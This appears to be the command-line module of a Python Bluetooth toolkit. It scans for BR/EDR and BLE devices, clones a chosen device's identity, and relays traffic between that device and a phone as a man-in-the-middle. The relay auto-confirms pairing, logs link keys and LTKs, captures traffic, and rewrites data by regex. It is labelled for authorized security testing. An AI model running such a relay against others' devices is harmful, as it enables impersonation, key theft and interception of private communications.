"""'app mitm' — BLE/BR ACL transparent relay between a target device and a phone (authorized testing only)."""
from __future__ import annotations

import argparse
import asyncio
import json
import logging
from datetime import datetime, timezone
from pathlib import Path
from typing import TYPE_CHECKING, Optional

if TYPE_CHECKING:
    from pybluehost.cli.app.mitm.pairing.delegate import PairingDelegate
    from pybluehost.cli.app.mitm.recon import ClonedIdentity, ScanEntry

logger = logging.getLogger(__name__)


def default_btsnoop_name() -> str:
    ts = datetime.now().strftime("%Y%m%d-%H%M%S")
    return f"mitm-{ts}.btsnoop"


# ---------------------------------------------------------------------------
# Identity JSON: bridge between scan and relay (merged by section)
# ---------------------------------------------------------------------------

IDENTITY_DEFAULT = "mitm-targets.json"
KEY_LOG_DEFAULT = "mitm-keys.jsonl"


def _section_from_identity(ident: "ClonedIdentity", mode: str) -> dict:
    if mode == "bredr":
        return {
            "address": ident.address,
            "name": ident.name,
            "class_of_device": ident.class_of_device,
            "eir_hex": ident.adv_data.hex(),
        }
    return {
        "address": ident.address,
        "address_type": ident.address_type,
        "name": ident.name,
        "adv_hex": ident.adv_data.hex(),
        "scan_rsp_hex": ident.scan_response.hex(),
    }


def _identity_from_section(section: dict, mode: str) -> "ClonedIdentity":
    from pybluehost.cli.app.mitm.recon import ClonedIdentity  # noqa: PLC0415

    if mode == "bredr":
        return ClonedIdentity(
            address=section["address"].upper(),
            address_type=0,
            adv_data=bytes.fromhex(section.get("eir_hex", "")),
            scan_response=b"",
            name=section.get("name"),
            class_of_device=section.get("class_of_device"),
        )
    return ClonedIdentity(
        address=section["address"].upper(),
        address_type=int(section.get("address_type", 0)),
        adv_data=bytes.fromhex(section.get("adv_hex", "")),
        scan_response=bytes.fromhex(section.get("scan_rsp_hex", "")),
        name=section.get("name"),
    )


def identity_save(path: str | Path, sections: dict) -> None:
    """Save identities (merge by section: update only the given mode section, keep other sections in the file)."""
    path = Path(path)
    data: dict = {}
    if path.exists():
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except (ValueError, OSError):
            data = {}
    if not isinstance(data, dict):
        data = {}
    data["version"] = 1
    data["saved_at"] = datetime.now(timezone.utc).isoformat()
    for mode, ident in sections.items():
        data[mode] = _section_from_identity(ident, mode)
    path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")


def identity_load(path: str | Path) -> dict:
    """Load identities; return {} if the file is missing or corrupt (no exception; relay side handles error messages)."""
    try:
        data = json.loads(Path(path).read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return {}
    if not isinstance(data, dict):
        return {}
    out: dict = {}
    for mode in ("bredr", "le"):
        if isinstance(data.get(mode), dict):
            try:
                out[mode] = _identity_from_section(data[mode], mode)
            except (KeyError, ValueError, TypeError):
                continue
    return out


def _select_delegate(pairing: str) -> "PairingDelegate":
    from pybluehost.cli.app.mitm.pairing.delegate import AutoConfirmDelegate

    # numeric/just-works both use AutoConfirm: in authorized MITM testing both ends are owned devices,
    # numeric comparison would inherently mismatch (MITM nature), so confirmation is just a formality;
    # InteractiveNumericDelegate reads stdin and would deadlock the adb-driven relay background task,
    # therefore it is not used in the automation gate.
    # Phone-side Numeric Comparison pop-ups are confirmed by scripts/mitm_phone.py via adb tap.
    return AutoConfirmDelegate()


# ---------------------------------------------------------------------------
# `mitm scan`: full discovery + pick from list -> identity JSON
# ---------------------------------------------------------------------------


def _sorted_by_rssi(entries: list) -> list:
    """Sort by RSSI descending; entries without RSSI are treated as -127 (weakest) and placed last. Original list is unchanged."""
    return sorted(entries, key=lambda e: e.rssi if e.rssi is not None else -127,
                  reverse=True)


def _print_entries(entries, label: str) -> None:
    print(f"\n=== {label} 扫描结果({len(entries)} 台)===")
    for i, e in enumerate(entries, 1):
        ident = e.identity
        rssi = f"{e.rssi:>4}" if e.rssi is not None else "   -"
        cod = (f"CoD={ident.class_of_device:06X}  "
               if ident.class_of_device is not None else "")
        print(f"{i:>3}  {ident.address}  {cod}RSSI={rssi}  "
              f"{ident.name or '(名称未知)'}")


def _choose(entries) -> "ScanEntry | str":
    """Pick by index / r to rescan (returns sentinel "rescan") / q or EOF to exit.
    Automation (--target) does not enter this path.
    """
    while True:
        try:
            raw = input("选择要复制的设备编号 / r 重扫 / q 退出: ").strip().lower()
        except EOFError:
            raise SystemExit("输入流已关闭,未保存。") from None
        if raw == "q":
            raise SystemExit("用户退出,未保存。")
        if raw == "r":
            return "rescan"
        if raw.isdigit() and 1 <= int(raw) <= len(entries):
            return entries[int(raw) - 1]
        print("无效输入")


def _auto_pick(entries, args) -> Optional["ScanEntry"]:
    """Automation hit for --target/--target-name (address match is case-insensitive); return None if no hit."""
    for e in entries:
        if args.target and e.identity.address.upper() == args.target.upper():
            return e
        if args.target_name and e.identity.name == args.target_name:
            return e
    return None


async def _scan_section(args, ctrl, mode: str) -> Optional["ClonedIdentity"]:
    """Scan one section (bredr/le) and select; returns identity, or None if automation misses.

    Interactive: r rescans indefinitely; q ends the entire scan via _choose raising SystemExit (nothing saved).
    """
    from pybluehost.cli.app.mitm.bredr_recon import (
        fetch_remote_name,
        inquiry_scan_all,
    )
    from pybluehost.cli.app.mitm.recon import ble_scan_all

    label = "BR/EDR inquiry" if mode == "bredr" else "BLE adv"

    async def sweep():
        if mode == "bredr":
            return await inquiry_scan_all(ctrl, rounds=args.br_rounds)
        return await ble_scan_all(ctrl, window=args.le_window)

    while True:
        entries = _sorted_by_rssi(await sweep())
        if not entries:
            print(f"({mode}) 未发现设备:让设备进配对模式/开盖,或换 --mode")
        _print_entries(entries, label)
        auto = _auto_pick(entries, args)
        if auto is not None:
            print(f"自动命中: {auto.identity.address}")
            ident = auto.identity
        elif args.target or args.target_name:
            return None  # automation mode: no match, don't fall into interactive
        else:
            pick = _choose(entries)
            if pick == "rescan":
                continue
            ident = pick.identity
        # RNR name fetch: needed on both interactive and automation paths — the
        # impersonation side needs the name regardless of how the target was matched.
        if ident.name is None and mode == "bredr":
            ident.name = await fetch_remote_name(ctrl, ident.address)
            print(f"RNR 补名: {ident.name}")
        return ident


async def _scan_main(args: argparse.Namespace) -> None:
    from pybluehost.cli.app.mitm.controllers import open_controller

    logger.warning("⚠ MITM 仅限授权测试:确保你对目标设备有合法授权。")
    ctrl, transport = await open_controller(args.upstream)
    sections: dict = {}
    try:
        if args.mode in ("bredr", "both"):
            ident = await _scan_section(args, ctrl, "bredr")
            if ident is not None:
                sections["bredr"] = ident
        if args.mode in ("le", "both"):
            ident = await _scan_section(args, ctrl, "le")
            if ident is not None:
                sections["le"] = ident
    finally:
        await _close(transport)

    if not sections:
        print("没有选定任何设备,未保存。")
        return
    path = args.save or IDENTITY_DEFAULT
    identity_save(path, sections)
    print(f"已保存到 {path}: {sorted(sections)}")


async def _close(transport) -> None:
    from pybluehost.cli.app.mitm.controllers import _close_transport
    await _close_transport(transport)


# ---------------------------------------------------------------------------
# `mitm relay`: start the relay from an identity JSON (or inline recon)
# ---------------------------------------------------------------------------


async def _inline_recon(args, ctrl, mode: str) -> Optional["ClonedIdentity"]:
    if args.mode not in (mode, "both") or not (args.target or args.target_name):
        return None
    if mode == "bredr":
        from pybluehost.cli.app.mitm.bredr_recon import inquiry_for_target
        return await inquiry_for_target(ctrl, target_addr=args.target,
                                        target_name=args.target_name)
    from pybluehost.cli.app.mitm.recon import scan_for_target
    return await scan_for_target(ctrl, target_addr=args.target,
                                 target_name=args.target_name)


async def _relay_main(args: argparse.Namespace) -> None:
    from pybluehost.cli.app.mitm.controllers import open_controller_pair
    from pybluehost.cli.app.mitm.session import MitmSession
    from pybluehost.cli.app.mitm.transform import DEMO_RULES, RegexReplacer

    logger.warning("⚠ MITM 仅限授权测试:确保你对目标设备与手机均有合法授权。")
    identities: dict = {"bredr": None, "le": None}

    # Identity source is one of two: identity JSON (default) / inline recon (--target/--target-name)
    if args.target or args.target_name:
        from pybluehost.cli.app.mitm.controllers import open_controller
        ctrl, transport = await open_controller(args.upstream)
        try:
            for mode in ("bredr", "le"):
                ident = await _inline_recon(args, ctrl, mode)
                if ident is not None:
                    identities[mode] = ident
        finally:
            await _close(transport)
    else:
        path = args.identity or IDENTITY_DEFAULT
        loaded = identity_load(path)
        if not loaded:
            raise SystemExit(
                f"身份文件 {path} 不存在或为空:先跑 `pybluehost app mitm scan`,"
                "或用 --target 指定目标。")
        identities.update(loaded)

    # --mode filter: "both" runs everything; a single mode keeps only that section
    if args.mode == "bredr":
        identities["le"] = None
    elif args.mode == "le":
        identities["bredr"] = None

    pair = await open_controller_pair(args.upstream, args.downstream)
    btsnoop = args.btsnoop or default_btsnoop_name()
    session = None
    try:
        # Construction is also inside try: BtsnoopCaptureTap opens (path, "wb") in its
        # ctor, so a bad --btsnoop path leaves both dongles open here — must go through
        # pair.close() to reset (a BE200 exiting with a live ACL wedges its firmware;
        # see the replug lesson in controllers.py).
        session = MitmSession(
            pair,
            identities=identities,
            delegate=_select_delegate(args.pairing),
            numeric=(args.pairing == "numeric"),
            btsnoop=btsnoop,
            clone_address=args.clone_address,
            key_log=args.key_log or KEY_LOG_DEFAULT,
            name_override=args.downstream_name,
            transform=RegexReplacer(DEMO_RULES),
        )
        await session.run()
    finally:
        if session is not None:
            await session.teardown()
        else:
            await pair.close()


def register_mitm_command(subparsers: argparse._SubParsersAction) -> None:
    p = subparsers.add_parser("mitm", help="BLE/BR ACL 透传中间人(授权测试专用)")
    sub = p.add_subparsers(dest="mitm_cmd", required=True)

    scan = sub.add_parser("scan", help="发现全部设备,列表选一个复制,存身份 JSON")
    scan.add_argument("--upstream", required=True, help="扫描用 transport")
    scan.add_argument("--mode", choices=["le", "bredr", "both"], default="both",
                      help="bredr→inquiry / le→adv scan / both→先 BR 后 LE")
    scan.add_argument("--save", help=f"身份 JSON 路径(默认 {IDENTITY_DEFAULT})")
    scan.add_argument("--target", help="自动化:直接按地址命中,不出列表")
    scan.add_argument("--target-name", help="自动化:按名字命中")
    scan.add_argument("--br-rounds", type=int, default=2,
                      help="BR inquiry 轮数(每轮 ~10.24s,默认 2)")
    scan.add_argument("--le-window", type=float, default=10.0, help="LE 扫描窗口秒")
    scan.set_defaults(func=lambda a: asyncio.run(_scan_main(a)))

    relay = sub.add_parser("relay", help="用身份 JSON 起中继(默认读 mitm-targets.json)")
    relay.add_argument("--upstream", required=True)
    relay.add_argument("--downstream", required=True)
    relay.add_argument("--mode", choices=["le", "bredr", "both"], default="both",
                       help="默认按身份文件内容全跑;可只跑一段")
    relay.add_argument("--identity", help=f"身份 JSON(默认 {IDENTITY_DEFAULT})")
    relay.add_argument("--target", help="无身份文件时的内联探测(地址)")
    relay.add_argument("--target-name", help="无身份文件时的内联探测(名字)")
    relay.add_argument("--key-log", help=f"link key/LTK JSONL(默认 {KEY_LOG_DEFAULT})")
    relay.add_argument("--btsnoop", help="btsnoop 输出(默认按时间戳)")
    relay.add_argument("--clone-address", action="store_true")
    relay.add_argument("--downstream-name", help="覆盖手机侧伪装名")
    relay.add_argument("--pairing", choices=["just-works", "numeric"],
                       default="just-works")
    relay.set_defaults(func=lambda a: asyncio.run(_relay_main(a)))
